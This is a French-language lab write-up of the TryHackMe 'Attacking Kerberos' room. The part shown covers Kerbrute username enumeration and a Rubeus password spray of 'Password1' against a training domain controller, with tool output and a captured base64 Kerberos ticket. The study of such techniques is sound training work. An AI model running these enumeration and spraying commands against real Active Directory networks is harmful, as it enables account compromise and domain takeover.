---
tags: [active directory, cyber, exploitation, kerberos, tryhackme, windows]
title: TryHackMe - Attacking Kerberos
created: '2020-08-20T13:23:09.391Z'
modified: '2020-08-20T16:06:21.517Z'
---

# TryHackMe - Attacking Kerberos

## Introduction

Cette fiche couvre toutes les bases de l'attaque de Kerberos, le service de ticketterie de Windows :

- le Enumération initial à l'aide d'outils comme Kerbrute et Rubeus
- Kerberoasting
- AS-REP roasting avec Rubeus et Impacket
- Attaques des tickets d'or/argent
- Passez le ticket
- Attaques de clés squelettes à l'aide de mimikatz

Cette salle est liée à des applications très concrètes et ne sera probablement pas utile pour les CTF, mais elle permet d'acquérir de solides connaissances de base sur la manière de faire de l'élévation de privilèges jusqu'à un administrateur de domaine en attaquant Kerberos et de prendre le contrôle d'un réseau.

## Enumération avec Kerbrute

On utilise `user.txt` une liste de noms pour énumérer :

```sh
kali@kali:~/Tools/Kerbrute$ ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local user.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/20/20 - Ronnie Flathers @ropnop

2020/08/20 11:55:51 >  Using KDC(s):
2020/08/20 11:55:51 >  	CONTROLLER.local:88

2020/08/20 11:55:52 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
2020/08/20 11:55:52 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
2020/08/20 11:55:52 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
2020/08/20 11:55:52 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
2020/08/20 11:55:52 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
2020/08/20 11:55:52 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
2020/08/20 11:55:52 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
2020/08/20 11:55:52 >  [+] VALID USERNAME:	 user3@CONTROLLER.local
2020/08/20 11:55:52 >  [+] VALID USERNAME:	 user2@CONTROLLER.local
2020/08/20 11:55:52 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
2020/08/20 11:55:52 >  Done! Tested 100 usernames (10 valid) in 0.830 seconds
```

## Harvesting & Brute-Forcing Fickets avec Rubeus

On tente un spray de `Password1` sur le domaine :

```cmd
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>echo 10.10.235.102 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  

  v1.5.0

[-] Blocked/Disabled user => Guest 
[-] Blocked/Disabled user => krbtgt 
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):
 
      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi 
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx 
      BIID7XGN5ee8uw7Y2CU9DDybo3IjCOVO9VouweyHyy8uiVK1RX/0tNDRIDt0B9FM3JjxQryKz4itRbdO
      kY2vNmsod1blu9JZ+nNceeHgyRLVwsZ/Gd/MPocQVq+IPVMGZVFGt1YH51XVEW7Ah7aVunyRrfmoUX1e
      QW6hWbySB4Ch3X98J+qUHz+gYEPEyy8fmuWq0Ta94SlFXvlswW+Z1E2b6tfWcJLrP5EcNvxGfBo15Pex
      A8m7JkkjVhJDKHOSHSpNRIsfR8XHvK9xbIsvN253g7sS6arya2qbyNr9JUKbRFod4dlzQRBdOqroEJfa
      Y3bWMRD5zLz3lI2Z7ZoZVUP+uiRCbp/iplnrl2YIm5ykAg8TwPS3sI5fUkKtHmWst0TI/8qIe4Rm4mKg
      T23ZOWeTzHVtbt6rBA95CV+KQpcjmlqaAw7PKbzTqPZboYyRQ4LYWgdSFMzHr0VOwAdNBHgs9upV852H
      b8RDwuW2flXT6YI3P2miYFccJ3KU1T+E6kMSEUaIPd5LIcGkStnxFXLx44R4BNwvfcTLejcB8H9jlgH1
      BsSO4z07MYlFOHVw6XtEOlYr4iOPKkEy3ZLt2mNIn7/iW+ZK4X7Gxi62gkS12tA6AtxCAcSb6r3wl6s4
      ixTbfgL3MZKmeDc5Gu7B9zcnFtJYhwZevmVvZJmwpn9koY+crXTJ7qRFdIhrDnqCn2jT2mzdyGFuoOk4
      HzpDK17AhQ/F8Hbn3CGmbvGB0xTv411VpFjvUq5ML+46/GDiabJI2jEg8FVSYoVpbLY2UhkpdzDaFebJ
      mO+EerqjLByAJGGXSExze+En+hGU67mvchuSUUDPCy/381k4sjVgZdg+6W+w+aw4LOxdoXrV+P8OhZZL
      lQdifMoXwvK4XfMvUMItzNbmVJv4TIb1crxnUw8tYLOxOtiKUOACBgklv1TlRizxkGTlNVL+gE8kGRNh
      ohONokRMKhGQxbOqtKLDZe0HPoE951v2Of5wu+H8GVLRleZkHCnKn4IDEIGCZ7YetAKWrhdO2WqEZb5m
      Fu2u06h4M29TqTd1AIYhu6GPWzv3bg1nyouzADYQGdPQD7TcQZYWgOOcX520TjkyPohETirxUXmnQ+Go
      kIqjUxqEA15mL1+7sLd7oPudFwFV9aN+ZEV4FAQncfCsGmY9gOeNpRgacRDoEorIt8Kv8v1yTMfn5vdm
      vyJ0EmTTdEQN5+9MnkVVTM0dlRK9NxTgFsZ8nA0mwB+kFwwZUrO9+N4nvt7gYyCVv8R6s3iM6lQbrwiv
      XSn942D07vW0GcaN2NTWGb71OAA6bujFIQltIw6qSPKoLNu8fQ2wV/FJAsyZKiMXA6OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIGnAV/kB/RRdGMRcpVMKjdCSRJoPnQmLWSzu
      Zmh+T7MzoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIwMDgyMDE1NTcwOFqmERgPMjAyMDA4MjEwMTU3MDhapxEYDzIwMjAwODI3MTU1NzA4WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs

[+] Done
```

